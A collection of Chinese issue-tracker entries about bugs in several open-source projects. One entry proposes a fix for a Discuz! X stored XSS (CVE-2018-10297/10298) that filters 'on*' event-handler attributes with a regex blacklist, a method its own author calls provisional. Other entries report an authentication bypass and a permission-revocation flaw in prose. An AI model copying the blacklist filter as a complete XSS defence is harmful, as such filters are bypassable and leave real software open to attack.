https://mirrors.ustc.edu.cn/homebrew-bottles/libfido2-1.11.0.arm64_monterey.bottle.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/a3c0ee89735aafd07a500035db3a20f03ce036c5b448ccfd8033fceff6489882--libfido2-1.11.0.arm64_monterey.bottle.tar.gz ==&gt; Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/zstd-1.5.2.arm64_monterey.bottle.2.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/d65cd57aceddfaaf4e5a43b70b1a2e1ba20b1ff738d0cbae2b078a0ff5b6f3f4--zstd-1.5.2.arm64_monterey.bottle.2.tar.gz ==&gt; Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/mysql-client-8.0.29.arm64_monterey.bottle.tar.gz Already downloaded: /Users/yuting/Library/Caches/Homebrew/downloads/8dc82e1c19dacc58bad02215bb3dc3483487f08c67dd24eea75a9570360d0e90--mysql-client-8.0.29.arm64_monterey.bottle.tar.gz ==&gt; Installing dependencies for mysql-client: ca-certificates, openssl@1.1, libevent, libcbor, libfido2 and zstd ==&gt; Installing mysql-client dependency: ca-certificates fatal: not in a git directory Error: Command failed with exit 128: git"
BUG：在发货/出货管理点击新增的时候，就会往后台发post请求增加表单信息,"现象 在到货/发货管理，点击新增时，执行时往后台发送了post请求，导致在取消/关闭Form时，依然新增了一条空白记录 代码片段 https://gitee.com/Singosgu/GreaterWMS/blob/master/templates/src/pages/inbound/asn.vue#L1301-1311 修复建议 直接去掉这段代码   <code>: newFormOpen postauth(_this.pathname + 'list/', _this.newAsn).then(res =&gt; { if (!res.detail) { _this.newFormData.asn_code = res.asn_code } }).catch(err =&gt; { _this.$q.notify({ message: err.detail, icon: 'close', color: 'negative' }) })"
[CT][MS][LITE][ASCEND710][offline] some model build failures,ASCEND710 离线模型推理失败 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph [MS_LITE_TEST][06:59:09 2022/11/19][new_net_test_mslite.cpp:1147][ERROR]Model build failed.   <code>: python3 msliteexecutor.py -c tc_fmk_GE_NET_LITE_ASCEND710_FP16_NORMAL_LITE_with_fasterrcnn_coco2017_bs_1_ascend_0001 -g new_net_test_mslite -f /home/jenkins-slave/workspace/MsLite_Deploy/ge_migrate01/conf/lite/net/ascend710/mindspore/GE_NET_LITE_fasterrcnn_coco2017_bs_1_ascend_0001.prototxt
3.2版本启动PigxNacosApplication，无法获取配置列表信息,pigx版本: 3.2 操作系统: windows10 是否修改包名: 无 3.2版本PigxNacosApplication启动的时候亚根就没有读取mysql配置，因为我将mysql连接的用户名写错，也能正常启动，3.1.0就能正常启动。如下图所示：   <code>: 3.2版本启动PigxNacosApplication，无法获取配置列表信息。
forwardTest非常消耗内存,执行序列数据分类任务，序列长度10以内，分类label约7w，测试样本条数大概8w条，内存消耗了35g， 打印日志发现内存消耗主要在这里。   <code>: output = self.network.forwardTest(input)
角色权限编辑后不生效,pigx版本: V2.7.0   <code>: 无 若用户正在访问某个菜单或操作，此时将其访问该菜单或该操作的权限关闭，用户任可进行访问或操作。 例如： 第一步、admin用户打开“用户管理”菜单。 第二步、编辑“管理员”角色权限，将“用户管理（新增、修改、删除）”权限去除。 第三步、admin用户新增/修改/删除某个用户，提示操作成功。（应该提示无权限）
jsonWebTokenUtile解析jwt的另一个错误,"第二个错误是发生在JsonWebTokenUtil里的parseJwt()这个方法里 经过debug发现，抛出这个错误是因为在MacValidator的isValid方法中，比较jwt的header和payload生成的摘要和解析jwt获得的摘要不一致，就会报出这个错误。按说没道理呀，不知道怎么处理。   <code>: public static JwtAccount parseJwt(String jwt, String appKey) throws ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException { Claims claims = Jwts.parser() .setSigningKey(DatatypeConverter.parseBase64Binary(appKey)) //在这一行会抛出SignatureException被jwtMatcher捕获到 .parseClaimsJws(jwt) .getBody(); public boolean isValid(byte[] data, byte[] signature) { byte[] computed = this.signer.sign(data); //这里的this.signer是macSigner alg=HS512 return MessageDigest.isEqual(computed, signature); }"
级联选择器和下拉多选组件提前触发 async-validator 校验。,"组件配置 column: 远程数据返回数据:   <code>: { label: ""test"", prop: ""mecId"", type: ""select"", multiple: true, dicUrl: ""/api/blade-system/dict-biz/dictionary?code=road_index_type"", props: { label: ""dictValue"", value: ""dictKey"" }, rules: [{ required: true, message: ""请选择test"", trigger: ""blur"" }] },"
FIX: cpplint code style,"It's better to add cpplint.py into generic.cmake. Also, I found the previous doesn't work, so I changed it.   <code>: cpplint.cmake"
PaddlePaddle distributed training API,"Here is the API design of PyTorch.distributed: https://github.com/pytorch/pytorch/issues/241. It looks very similar to MPI by means of has the concept process group, which is the concept ""world"" in MPI has the concept of rank, which is a 0-based id of processes. processes take actions according to their ranks. processes communicate and synchronize with each other by calling , , etc MPI style functions. I personally believe that MPI is very flexible and able to describe various concurrent algorithms. But it is not friendly to fault-recovery. It seems that pytorch.distributed would be good for researchers who work on relatively small datasets and/or on a small group of computers/GPUs. However, PaddlePaddle, as an industrial application platform cannot follow this style.   <code>: send recv"
[ST][MS][CI][FaceRecognitionforTracking][gpu 8p]推理精度返回nan,FaceRecognitionforTracking 网络gpu 8p 推理精度返回nan / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包：HISI_C83/20221017 mindspore:master_20221127160042_bbb534a (/): /mode graph test_ms_facerecognitionfortracking_lfw_gpu_train_infer_8p_0001.py pytest -s test_ms_facerecognitionfortracking_lfw_gpu_train_infer_8p_0001.py 推理精度ok 转给安正气   <code>: -----------------------load model success----------------------- exact feature... exact inclass likehood... exact btclass likehood... ---0.5: 0.0@nan ---0.3: 0.0@nan ---0.1: 0.0@nan ---0.01: 0.0@nan ---0.001: 0.0@nan ---0.0001: 0.0@nan ---1e-05: 0.0@nan
默认主题时，菜单收缩，预览时背景色透明影响使用,"环境信息 pigx版本: 3.10 是否修改包名: 是 截图   <code>: .el-menu--popup{ margin-left: -10px; background-color: #fff ; .el-menu-item{ background-color: rgb(32,34,42) ; span,i { color:rgb(184,182,187) ; } &amp;.is-active{ background-color:rgba(0,0,0,1) ; span,i { color:#fff ; } &amp;:hover{ background-color:rgba(0,0,0,1) ; } } &amp;:hover{ background-color: rgb(32,34,42) ; i,span{ color:#fff ; } } } }"
【论文复现】矩阵乘法,"请问这样的矩阵乘法在paddle中如何实现，pytorch和numpy都可以正常运算，但paddle会报维度不匹配的错误，如果中间使用numpy会导致无法计算梯度   <code>: x = fluid.layers.ones((2, 1, 2, 2), dtype='float32') y = fluid.layers.ones((1, 65, 2, 1), dtype='float32') out = fluid.layers.matmul(x, y) InvalidArgumentError: The batch size of the two matrices should be equal, or at least one is zero. But received X's shape: [2, 2, 2], Y's shape: [65, 2, 1]. [Hint: Expected mat_dim_x.batch_size_ == mat_dim_y.batch_size_ || mat_dim_x.batch_size_ == 0 || mat_dim_y.batch_size_ == 0 == true, but received mat_dim_x.batch_size_ == mat_dim_y.batch_size_ || mat_dim_x.batch_size_ == 0 || mat_dim_y.batch_size_ == 0:0 != true:1.] at (/paddle/paddle/fluid/operators/matmul_op.cc:357)"
模型库-图像分类  训练 一直内核重启  求指导  那里可以看到详细的日志,"I1116 05:06:47.209822 11126 Util.cpp:166] commandline: --use_gpu=False --trainer_count=1 I1116 05:06:47.735155 11126 GradientMachine.cpp:94] Initing parameters.. I1116 05:06:50.696238 11126 GradientMachine.cpp:101] Init parameters done. [I 05:07:30.348 NotebookApp] KernelRestarter: restarting kernel (1/5) WARNING:root:kernel c1098098-63f1-46af-9e37-3bfa0458bdcb restarted http://www.paddlepaddle.org/docs/develop/models/image_classification/README.html   <code>: optimizer = paddle.optimizer.Momentum( momentum=0.9, regularization=paddle.optimizer.L2Regularization(rate=0.0005 * BATCH_SIZE), learning_rate=learning_rate / BATCH_SIZE, learning_rate_decay_a=0.1, learning_rate_decay_b=128000 * 35, learning_rate_schedule=""discexp"", ) 只拿了一百多张图片做测试"
脚本的加载有先后顺序问题,"如果按照下述的顺序定义2个不同的xml 则会报错   <code>: &lt;?xml version=""1.0"" encoding=""UTF-8"" ?&gt; &lt;!DOCTYPE flow PUBLIC ""liteflow"" ""liteflow.dtd""&gt; &lt;flow&gt; &lt;chain name=""s0""&gt; // IF(s1, s2, s3); IF(s1, s2, s4); &lt;/chain&gt; &lt;nodes&gt; &lt;node id=""s1"" name=""groovy 脚本1"" language=""groovy"" type=""if_script""&gt; &lt;![CDATA[ System.out.println(""Groovy 脚本1 被调用。""); return false; ]]&gt; &lt;/node&gt; &lt;node id=""s2"" name=""groovy 脚本2"" language=""groovy"" type=""script""&gt; &lt;![CDATA[ System.out.println(""Groovy 脚本2 被调用。""); ]]&gt; &lt;/node&gt; &lt;node id=""s3"" name=""groovy 脚本3"" language=""groovy"" type=""script""&gt; &lt;![CDATA[ System.out.println(""Groovy 脚本3 被调用。""); ]]&gt; &lt;/node&gt; &lt;/nodes&gt; &lt;/flow&gt; &lt;?xml version=""1.0"" encoding=""UTF-8"" ?&gt; &lt;!DOCTYPE flow PUBLIC ""liteflow"" ""liteflow.dtd""&gt; &lt;flow&gt; &lt;nodes&gt; &lt;node id=""s4"" name=""Groovy 脚本4"" language=""groovy"" type=""script""&gt; &lt;![CDATA[ System.out.println(""Groovy 脚本4 被调用。""); ]]&gt; &lt;/node&gt; &lt;/nodes&gt; &lt;/flow&gt;"
ConditionComponent 改造成通用组件,"ConditionComponent 组件改造成通用条件输出组件 增加 Condition 属性 属性为真时输出内部 HTML   <code>: &lt;ConditionComponent Condition=""true""&gt; &lt;div class=""alert alert-danger"" role=""alert""&gt; &lt;span&gt;演示系统禁止修改系统使用字典配置项&lt;/span&gt; &lt;/div&gt; &lt;/ConditionComponent&gt;"
关于手机号码登录的疑惑,pigx版本: 演示环境 操作系统: mac 是否修改包名: 否   <code>: 场景：手机号码登录 输入一下手机号码，手机验证码随便写，或者不填写，居然也能获取token 疑惑：不知道是不是一个bug 还是我的操作姿势不正确
[CT][MS][FillDiagonal]FillDiagonal 没有做每个维度形状相同条件的校验 ,"算子在gpu平台 两种模式下 运行test_filldiagonal_input_20x30_dtype_fp32_fill_value_2p2 出现精度问题，但是实际是没有做每个维度形状相同条件的校验 def test_filldiagonal_input_20x30_dtype_fp32_fill_value_2p2(): input_x = Tensor(np.random.randn(20, 30), dtype=mstype.float32) fact = FillDiagonalMock(attributes={""fill_value"": 2.2}, inputs=[input_x]) /mode graph 异常用例，用例失败   <code>: fact.forward_cmp()"
图片同表单一起提交,"问题描述 需要实现图片同表单一起提交。图示上传后前台转成base64进行预览，提交后下次修改时按照后台回传的文件相对路径进行显示 目前设置propsHttp.home会导致上传时base64格式预览异常，不设置又会导致修改时预览异常 建议解决方法 可否在获取文件完整路径时动态判断文件相对路径格式，部分代码如下：   <code>: // upload.js imgUrl () { if (!this.validatenull(this.text)) { return getFileUrl(this.homeUrl, this.text[0]); } } // util.js export const getFileUrl = (home, uri) =&gt; { return !uri || !home || uri.match(/(^http:\/\/|^https:\/\/|^\/\/|data:image\/)/) ? uri : home + uri };"
"在训练中突然出错,数据集是我自己做的,不知道是不是这个问题","我使用自己做的训练集执行训练,前面还好好的,但是途中就突然报错了,报错信息如下:   <code>: Pass 0, Batch 0, Cost 11.055951, {'classification_error_evaluator': 0.9375} ................................................................................................... Pass 0, Batch 100, Cost 0.000000, {'classification_error_evaluator': 0.0} ...........................................Thread [140601219049216] Forwarding __batch_norm_1__, *** Aborted at 1513734231 (unix time) try ""date -d @1513734231"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGFPE (@0x7fe0499937a8) received by PID 4054 (TID 0x7fe045b76700) from PID 1234778024; stack trace: *** @ 0x7fe06709e390 (unknown) @ 0x7fe0499937a8 paddle::BaseMatrixT&lt;&gt;::applyUnary&lt;&gt;() @ 0x7fe049993a98 paddle::BaseMatrixT&lt;&gt;::square2() @ 0x7fe049877721 paddle::BatchNormalizationLayer::calMeanAndStd() @ 0x7fe049878ddb paddle::BatchNormalizationLayer::forward() @ 0x7fe0498a2aa7 paddle::NeuralNetwork::forward() @ 0x7fe0498af5ac paddle::TrainerThread::forward() @ 0x7fe0498b3de8 paddle::TrainerThread::computeThread() @ 0x7fe05aa8dc80 (unknown) @ 0x7fe0670946ba start_thread @ 0x7fe066dca3dd clone @ 0x0 (unknown) Process finished with exit code 136 (interrupted by signal 8: SIGFPE)"
CVE-2018-10297/CVE-2018-10298 漏洞修复方案探讨,"来自其他网站可行的POC: https://laworigin.github.io/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/ 我在测试修复的时候发现Discuz! X的门户编辑器和论坛编辑器体制不一样，系统会直接提交html代码上去，所以无法通过简单的转义方式进行XSS的修复（POC提到通过转义修复，实际上不行，如果那么修复了那门户页面上都是html代码......） 考虑到存储型XSS漏洞安全隐患还是较大，我本来考虑通过过滤的形式进行修复，但是考虑到门户还是支持直接输入html的，这样修复会影响发布部分含有特殊代码的html。 在此我也抛砖引玉，给出过滤方式的修复方案。当然也希望各位大佬给出更好的，适合提交到主线的修复方案。   <code>: function getstr($string, $length = 0, $in_slashes=0, $out_slashes=0, $bbcode=0, $html=0) { global $_G; $string = trim($string); $sppos = strpos($string, chr(0).chr(0).chr(0)); if($sppos !== false) { $string = substr($string, 0, $sppos); } if($in_slashes) { $string = dstripslashes($string); } $string = preg_replace(""/\[hide=?\d*\](.*?)\[\/hide\]/is"", '', $string); if($html &lt; 0) { $string = preg_replace(""/(\&lt;[^\&lt;]*\&gt;|\r|\n|\s|\[.+?\])/is"", ' ', $string); $string = getstr_remove_xss($string);//添加的代码，调用以下函数 } elseif ($html == 0) { $string = dhtmlspecialchars($string); } if($length) { $string = cutstr($string, $length); } if($bbcode) { require_once DISCUZ_ROOT.'./source/class/class_bbcode.php'; $bb = &amp; bbcode::instance(); $string = $bb-&gt;bbcode2html($string, $bbcode); } if($out_slashes) { $string = daddslashes($string); } return trim($string); } function getstr_remove_xss($string) {//添加的过滤函数，过滤了html标签的onxx属性 $parm = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); for ($i = 0; $i &lt; sizeof($parm); $i++) { $pattern = '/'; for ($j = 0; $j &lt; strlen($parm[$i]); $j++) { if ($j &gt; 0) { $pattern .= '('; $pattern .= '(&amp;#[x|X]0([9][a][b]);?)?'; $pattern .= '|(&amp;#0([9][10][13]);?)?'; $pattern .= ')?'; } $pattern .= $parm[$i][$j]; } $pattern .= '/i'; $string = preg_replace($pattern, ' ', $string); } return $string; }"
遇到个radio的小bug,"这是我的jsp:   <code>: table.render({ id: 'shry' , title: '选择####信息表' , elem: '#shry_table' , cellMinWidth: 80 //全局定义常规单元格的最小宽度，layui 2.2.1 新增 , width: 800 , cols: [[ {type: 'radio', fixed: 'left'} // 添加单选框列 , {field: 'xh', width: 80, title: '序号', type: 'numbers'} , {field: 'SWRYDM', width: 210, title: '####代码'} , {field: 'RYSFMC', width: 160, title: '姓名'} ]] , page: true // 是否显示分页 }); &lt;!--####弹窗--&gt; &lt;div id=""rgsh"" style="" width: 900px; height:450px; display:none""&gt; &lt;%--####--%&gt; &lt;form class=""layui-form"" action=""""&gt; &lt;div class=""layui-form-item"" style=""margin-left:50px;margin-top:20px""&gt; &lt;div class=""layui-inline"" &gt; &lt;div class=""sh_title01"" style=""width: 100%;border-bottom:none""&gt; &lt;div class=""blold""&gt;请选择####:&lt;/div&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;table id=""shry_table"" lay-filter=""shry"" &gt;&lt;/table&gt;&lt;!-- 提取选中的####代码 --&gt; &lt;/div&gt; &lt;div class=""layui-form-item"" style=""margin-left:50px;margin-top:10px""&gt; &lt;div class=""layui-inline"" style=""display:inline"" &gt; &lt;label class=""layui-form-label"" style=""display:inline; width: 16%"" &gt;请输入####密码:&lt;/label&gt; &lt;div class=""layui-input-inline"" style=""display:inline; width: 20%"" &gt; &lt;input class=""layui-input"" required lay-verify=""required"" style=""width: 100%"" id=""hyrymm"" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;"
【MindSpore】【Ascend】【C类】【u2net】在执行1p&8p训练完成后，日志未打印训练成功相关提示信息,"【Document Link】/【文档链接】 research/cv/u2net/output.log [WARNING] CORE(3836,ffffbe6aa7d0,python):2022-10-25-08:33:34.350.501 [mindspore/core/ir/anf_extends.cc:66] fullname_with_scope] Input 0 of cnode is not a value node, its type is CNode. [WARNING] DEVICE(3836,ffffbe6aa7d0,python):2022-10-25-08:33:48.709.906 [mindspore/ccsrc/runtime/hardware/ascend/ascend_graph_optimization.cc:259] SelectKernel] There are 422 node/nodes used reduce precision to selected the kernel! [WARNING] MD(3836,fffd9a7fc100,python):2022-10-25-08:35:12.037.005 [mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc:758] DetectPerBatchTime] Bad performance attention, it takes more than 25 seconds to fetch a batch of data from dataset pipeline, which might result timeout problem. You may test dataset processing performance(with creating dataset iterator) and optimize it. epoch: 1 step: 879, loss is 2.0135302543640137 epoch time: 289893.339 ms, per step time: 329.799 ms epoch: 2 step: 879, loss is 1.6471590995788574 epoch time: 156468.510 ms, per step time: 178.007 ms epoch: 3 step: 879, loss is 1.5571813583374023 epoch time: 156581.758 ms, per step time: 178.136 ms epoch: 4 step: 879, loss is 1.22123122215271 epoch time: 156480.002 ms, per step time: 178.020 ms epoch: 5 step: 879, loss is 1.5587036609649658 epoch time: 156563.369 ms, per step time: 178.115 ms epoch: 6 step: 879, loss is 1.6914230585098267 epoch time: 156120.557 ms, per step time: 177.612 ms epoch: 7 step: 879, loss is 1.5400354862213135 epoch time: 156122.499 ms, per step time: 177.614 ms epoch: 8 step: 879, loss is 2.715216636657715 epoch time: 156176.560 ms, per step time: 177.675 ms epoch: 9 step: 879, loss is 1.258265733718872 epoch time: 156011.166 ms, per step time: 177.487 ms epoch: 10 step: 879, loss is 1.0617434978485107 epoch time: 156392.879 ms, per step time: 177.921 ms 此单卡训练为10轮训练跑完之后，未打印训练成功提示信息 <ol start=""3""> 【Existing Issues】/【存在的问题】 在执行1p&amp;8p训练完成后，output.log日志未打印训练成功相关信息 【Expected Result】【预期结果】 训练完成后，应打印训练成功提示信息，供告知训练结果 环境信息： -- CANN 版本: (CANN 5.0.4 B065) -- python 版本:Python 3.7.5 -- 操作系统版本:Ubuntu 18.04.6   <code>: GetNext"
对于$ref的支持的问题,"添加全局Header，使用到$ref，发现有点问题。（暂时不考虑保留字段Authorization，对他的一些定义本身就会被忽略） k4j无法正常显示来自$ref的信息，比如平台号   <code>: &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.6.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-springdoc-ui&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springdoc&lt;/groupId&gt; &lt;artifactId&gt;springdoc-openapi-ui&lt;/artifactId&gt; &lt;version&gt;1.5.0&lt;/version&gt; &lt;/dependency&gt; @Bean public GroupedOpenApi mainApi(@Qualifier(""GlobalHeaderOpenApiCustomizer"") OpenApiCustomiser globalHeader) { return GroupedOpenApi.builder().group(""0"") .addOpenApiCustomiser(globalHeader) .pathsToMatch(paths) .packagesToScan(packagedToMatch).build(); } @Bean public OpenAPI USPFinanceAPI() { StringSchema schema = new StringSchema(); return new OpenAPI() .components(new Components().addParameters(""Authorization"", new HeaderParameter().required(true) .name(""Authorization"").description(""header Authorization"").schema(schema)) .addParameters(""PlatformCode"", new HeaderParameter().required(true) .name(""PlatformCode"").description(""header 平台号"").schema(schema))); } @Bean(name = ""GlobalHeaderOpenApiCustomizer"") public OpenApiCustomiser customerGlobalHeaderOpenApiCustomizer() { return openApi -&gt; openApi.getPaths().values().stream().flatMap(pathItem -&gt; pathItem.readOperations().stream()) .forEach(operation -&gt; operation .addParametersItem(new HeaderParameter().$ref(""#/components/parameters/Authorization"")) .addParametersItem(new HeaderParameter().$ref(""#/components/parameters/PlatformCode""))); }"
@DSTransactional注解,"各依赖版本如下： dynamic-datasource-spring-boot-starter：3.5.1 使用@DSTransactional后，依次调用A、B两个service 其中A不增加@DS注解默认获取primary数据源，此时ConnectionFactory中CONNECTION_HOLDER的ConnectionProxy对应的key是default 第二个B增加@DS注解（name=order（primary数据源）），此时获取连接时因为不存在order，又会创建一个key为order的 ConnectionProxy，导致default和order变成两个不同的ConnectionProxy，导致同一个库在事务中不一致。 观察代码如下： @加贝 public Connection getConnection() throws SQLException { String xid = TransactionContext.getXID(); if (StringUtils.isEmpty(xid)) { return determineDataSource().getConnection(); } else { String ds = DynamicDataSourceContextHolder.peek(); ds = StringUtils.isEmpty(ds) ? ""default"" : ds; ConnectionProxy connection = ConnectionFactory.getConnection(ds); return connection == null ? getConnectionProxy(ds, determineDataSource().getConnection()) : connection; } } 个人建议： 上述方法中的default可否换成获取配置中的primary?   <code>: @Override public Connection getConnection(String username, String password) throws SQLException { String xid = TransactionContext.getXID(); if (StringUtils.isEmpty(xid)) { return determineDataSource().getConnection(username, password); } else { String ds = DynamicDataSourceContextHolder.peek(); ds = StringUtils.isEmpty(ds) ? ""default"" : ds; ConnectionProxy connection = ConnectionFactory.getConnection(ds); return connection == null ? getConnectionProxy(ds, determineDataSource().getConnection(username, password)) : connection; } }"
html源码中包含的百度站长信息可以删除吗？,"百度站长的统计代码放在项目里不太好吧，这可是后台呀   <code>: var _hmt = _hmt || []; (function() { var hm = document.createElement(""script""); hm.src = ""https://hm.baidu.com/hm.js?8acef669ea66f479854ecd328d1f348f""; var s = document.getElementsByTagName(""script"")[0]; s.parentNode.insertBefore(hm, s); })();"
关于自定义弹窗编辑的字段该如果定义，请指教,"我现在有些功能，不能直接代码生成，需要像修改密码那种模式，弹窗+自定义字段 出现问题:选择商户下拉，无法把值显示到文本框，下拉之后如何触发选择事件   <code>: &lt;VolForm ref=""myform"" :label-width=""150"" :loadKey=""true"" :formFields=""formFields1"" :formRules=""formRules1"" &gt;&lt;/VolForm&gt;"
Infershape bug of Unique with data type int64,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Run Unique Op in data type int64 Output shape of Unique not update. Test case pass.   <code>: import numpy as np import pytest import mindspore.context as context import mindspore.nn as nn from mindspore import Tensor import mindspore.common.dtype as mstype from mindspore.ops import operations as P context.set_context(mode=context.GRAPH_MODE, device_target=""Ascend"") class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.unique = P.Unique() def construct(self, x): return self.unique(x) @pytest.mark.level0 @pytest.mark.platform_arm_ascend_training @pytest.mark.platform_x86_ascend_training @pytest.mark.env_onecard def test_unqiue(): #x = Tensor(np.array([1, 1, 2, 2, 3, 3]), mstype.int32) x = Tensor(np.array([6, 2, 5, 6, 1]), mstype.int32) unique = Net() output = unique(x) expect1 = np.array([6, 2, 5, 1]) expect2 = np.array([0, 1, 2, 0, 3]) print(""---huawei--"", output[0].asnumpy()) assert (output[0].asnumpy() == expect1).all() assert (output[1].asnumpy() == expect2).all()"
cascader组件多选 懒加载的情况下回显不了,"{ label: ""地区行政编码（可多选，逗号分隔）"", prop: ""zoneCodes"", type: ""cascader"", multiple: true, props: { label: 'name', value: 'code' }, lazy: true, checkStrictly:false, lazyLoad(node, resolve) { let stop_level = 1; let level = node.level; let data = node.data || {} let code = data.code; let list = []; let callback = () =&gt; { resolve((list || []).map(ele =&gt; { return Object.assign(ele, { leaf: level &gt;= stop_level }) })); } if (level === 0) { // eslint-disable-next-line no-undef axios.get().then(res =&gt; { list = res.data.data; callback() }) } else { // eslint-disable-next-line no-undef axios.get().then(res =&gt; { list = res.data.data; callback() }) } }, addDisplay: false, editDisplay: false, viewDisplay: false, rules: [{ required: true, message: ""请输入地区行政编码（可多选，逗号分隔）"", trigger: ""blur"" }] }, 赋值数据： [""14"",""1401""]这样能回显，但是这个是单选的 [[""14"",""1401""]] 多选的，这样回显不了 我尝试过不用懒加载的方式多选的情况，是可以回显的 懒加载的方式单选的情况，也是可以回显的 但是懒加载的方式多选的情况，就是不行   <code>: /api/blade-system/region/select /api/blade-system/region/select?code=${code}"
调用接口报错：Handler dispatch failed; nested exception is java.lang.UnsatisfiedLinkError: org.opencv.ml.SVM.create_0()J,请问大佬这个是什么原因   <code>: org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.UnsatisfiedLinkError: org.opencv.ml.SVM.create_0()J at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1055) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ............... Caused by: java.lang.UnsatisfiedLinkError: org.opencv.ml.SVM.create_0()J at org.opencv.ml.SVM.create_0(Native Method) at org.opencv.ml.SVM.create(SVM.java:117) at com.recognition.util.PlateUtil.&lt;clinit&gt;(PlateUtil.java:40) at com.recognition.service.impl.PlateServiceImpl.doRecognise(PlateServiceImpl.java:154) at com.recognition.service.impl.PlateServiceImpl.recognise(PlateServiceImpl.java:103) at com.recognition.service.impl.PlateServiceImpl$$FastClassBySpringCGLIB$$59af33cc.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at com.recognition.service.impl.PlateServiceImpl$$EnhancerBySpringCGLIB$$a9704092.recognise(&lt;generated&gt;) at com.recognition.controller.PlateController.recognise(PlateController.java:84) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ... 90 common frames omitted
multi samples from one distribution have same results ,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : the results from three samples are same the results should be different   <code>: import numpy as np from scipy import stats import mindspore.context as context import mindspore.nn as nn import mindspore.nn.probability.distribution as msd from mindspore import Tensor from mindspore import dtype class Sampling(nn.Cell): """""" Test class: sample of Normal distribution. """""" def __init__(self, shape, seed=0): super(Sampling, self).__init__() self.n1 = msd.Normal(0, 1, seed=seed, dtype=dtype.float32) self.shape = shape def construct(self, mean=None, sd=None): s1 = self.n1.sample(self.shape, mean, sd) s2 = self.n1.sample(self.shape, mean, sd) s3 = self.n1.sample(self.shape, mean, sd) return s1, s2, s3 def test_sample_graph(): """""" Test sample. """""" context.set_context(mode=context.GRAPH_MODE, save_graphs=True, device_target=""GPU"") shape = (2, 3) seed = 0 samp = Sampling(shape, seed=seed) sample1,sample2,sample3 = samp() print(""test graph mode"") print(""first sample is :"", sample1) print(""second sample is:"", sample2) print(""third sample is:"", sample3) if __name__ == ""__main__"": test_sample_graph()"
